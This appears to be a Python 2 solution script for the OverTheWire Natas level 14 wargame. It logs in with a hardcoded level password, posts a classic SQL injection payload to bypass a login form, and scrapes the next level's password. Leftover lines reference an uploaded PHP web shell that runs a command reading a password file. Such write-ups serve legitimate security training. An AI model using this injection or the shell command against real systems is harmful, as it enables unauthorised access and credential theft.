#!/usr/bin/env python
# SIMPLE SQL INJECTION
import requests
import re

username='natas14'
password='Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '/upload/1z3lzhvqhs.php?v= cat /etc/natas_webpass/natas14'
session = requests.session()
files = { 'file':open('natas12_rce.php', 'rb')}
# response = requests.get(url, auth=(username, password))
response = session.post(url, auth=(username,password), data= {'username': '" or "1" = "1', 'password': '" or "1" = "1'})
content = response.text
# print content
print re.findall('The password for natas15 is (.*)<br>', content)[0]

# Here it asks for username and password which we don't know. So, instead we use the basic SQL injection to log in
